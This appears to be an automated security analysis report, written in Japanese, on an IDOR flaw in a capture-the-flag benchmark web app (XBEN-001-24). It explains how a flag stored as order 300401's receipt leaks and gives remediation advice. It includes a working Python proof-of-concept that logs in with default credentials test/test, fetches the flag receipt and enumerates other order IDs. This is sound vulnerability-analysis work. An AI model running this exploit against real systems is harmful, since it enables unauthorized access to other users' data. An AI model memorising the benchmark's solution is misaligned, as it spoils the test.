# Security Analysis: __init__.py - File operations resource

## ファイル情報

- **ファイルパス**: `benchmarks/benchmarks/XBEN-001-24/app/website/app/__init__.py`
- **検出パターン**: File operations resource

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 90**

## 脆弱性タイプ

- `IDOR`

## PAR Policy Analysis

### Principals (データ源)

- **order_id (URL parameter)**: Untrusted
  - Context: URLパスパラメータとしてユーザーから提供されるorder_id
  - Risk Factors: ユーザー制御可能, 直接オブジェクト参照に使用, 認可チェックなし
- **session['user_id']**: SemiTrusted
  - Context: ログイン成功後にセッションに保存されるユーザーID
  - Risk Factors: 認証済みだが認可には使用されていない
- **/flag file content**: Trusted
  - Context: サーバーサイドのフラグファイル内容
  - Risk Factors: 機密データがDBに保存されている, 不適切なアクセス制御

### Actions (セキュリティ制御)

- **session.get('user_id') check**: Insufficient
  - Function: ユーザーがログインしているかを確認
  - Weaknesses: 認証のみで認可を確認していない, ユーザーと注文の関連を検証していない
  - Bypass Vectors: 任意のユーザーでログインすれば任意の注文にアクセス可能
- **Order.query.get(order_id)**: Missing
  - Function: 注文データの取得
  - Weaknesses: ユーザーIDによるフィルタリングなし, 直接オブジェクト参照
  - Bypass Vectors: 任意のorder_idを指定してデータ取得

### Resources (操作対象)

- **Order.receipt (database field)**: Critical
  - Operation: データベース読み取り
  - Protection: 認証のみ（不十分）
- **/flag file**: Critical
  - Operation: ファイル読み取り→DB保存
  - Protection: なし

### Policy Violations

#### AUTHZ-001: リソースへのアクセスには適切な認可チェックが必要

- **Path**: order_id (URL param) -> session check (認証のみ) -> Order.query.get() -> receipt表示
- **Severity**: critical
- **Confidence**: 0.95

#### DATA-001: 機密データは適切なアクセス制御で保護する必要がある

- **Path**: /flag file -> open() -> Order.receipt -> IDOR経由で漏洩
- **Severity**: critical
- **Confidence**: 0.90

## マッチしたソースコード

```code
open('/flag')
```

## 詳細解析

このアプリケーションは**IDOR（Insecure Direct Object Reference）脆弱性**を持つトレーディングプラットフォームです。

**主要な脆弱性の詳細**:

1. `/order/<int:order_id>/receipt` エンドポイントでは、ユーザーがログインしているかどうかのみを確認し、**リクエストされた注文がそのユーザーのものかどうかを検証していません**。これにより、認証済みの攻撃者は任意のorder_idを指定して他のユーザーの注文レシートを閲覧できます。

2. アプリケーション初期化時に `/flag` ファイルの内容がorder_id=300401のレシートとして保存されています。この注文はuser_idがNullで、どのユーザーにも紐付いていません。

3. IDORを悪用して `/order/300401/receipt` にアクセスすることで、認証済みユーザーは機密データ（フラグ）を取得できます。

**攻撃シナリオ**:
1. デフォルト認証情報（test/test）でログイン
2. /order/300401/receipt にアクセス
3. フラグの内容がレシートとして表示される

## PoC（概念実証コード）

```text
# IDOR脆弱性を利用したフラグ取得PoC
import requests

# ターゲットURL
BASE_URL = "http://localhost:5000"  # 実際のホストに変更

# セッションを開始
session = requests.Session()

# Step 1: デフォルト認証情報でログイン
print("[*] ログイン中...")
login_data = {"username": "test"}
resp = session.post(f"{BASE_URL}/", data=login_data, allow_redirects=True)

# Step 2: パスワードページでパスワードを送信
print("[*] パスワード送信中...")
password_data = {"password": "test"}
resp = session.post(f"{BASE_URL}/password/test", data=password_data, allow_redirects=True)

# Step 3: IDORを利用してフラグが含まれるレシートにアクセス
# フラグはorder_id=300401に保存されている
print("[*] IDOR脆弱性を利用してフラグを取得中...")
resp = session.get(f"{BASE_URL}/order/300401/receipt")

if resp.status_code == 200:
    print("[+] レシートページにアクセス成功!")
    # HTMLからフラグを抽出（receiptフィールドに含まれている）
    if "FLAG" in resp.text or "flag" in resp.text.lower():
        print("[+] フラグを含むレシートを発見!")
        print(resp.text)
else:
    print(f"[-] アクセス失敗: {resp.status_code}")

# 追加: 他の注文IDを列挙してレシートを取得
print("\n[*] 他の注文IDを列挙中...")
for order_id in [300123, 300214, 300327, 300481, 300401]:
    resp = session.get(f"{BASE_URL}/order/{order_id}/receipt")
    if resp.status_code == 200:
        print(f"[+] Order ID {order_id}: アクセス成功")
```

## 修復ガイダンス

### /order/<order_id>/receipt エンドポイント

- **Required**: 注文の所有者確認を追加
- **Guidance**: Order.query.filter_by(id=order_id, user_id=user_id).first() を使用して、現在のユーザーの注文のみ取得するように変更
- **Priority**: critical

### 機密データの保存方法

- **Required**: フラグなどの機密データをDBに保存しない
- **Guidance**: 機密データは専用のセキュアストレージに保存し、必要な認可を持つユーザーのみアクセス可能にする
- **Priority**: critical

### 認証情報管理

- **Required**: デフォルト認証情報の削除とパスワードハッシュ化
- **Guidance**: bcryptなどを使用してパスワードをハッシュ化し、デフォルトの認証情報を本番環境から削除する
- **Priority**: high

### secret_key

- **Required**: ハードコードされた秘密鍵を環境変数から取得
- **Guidance**: app.secret_key = os.environ.get('SECRET_KEY') とし、強力なランダムキーを使用
- **Priority**: high

## 解析ノート

分析対象のコードを調査しました。以下の主要な脆弱性を発見しました：

1. **IDOR (Insecure Direct Object Reference)**: routes.py の `/order/<int:order_id>/receipt` エンドポイントで、ユーザーが自分の注文かどうかを確認せずに任意のorder_idでレシートを取得できます。コメントで明示的に脆弱性が記載されています。

2. **機密データ漏洩**: __init__.py でフラグファイル(/flag)の内容がOrderのreceiptフィールドに保存されています。このOrderはuser_id=Noneで、特定ユーザーに紐付いていません。

3. **IDORとデータ漏洩の組み合わせ**: IDORを利用してorder_id=300401のレシートにアクセスすることで、フラグの内容を取得できます。

4. **その他のセキュリティ問題**:
   - ハードコードされた秘密鍵（app.secret_key）
   - パスワードが平文で保存
   - デフォルトの認証情報（test/test）

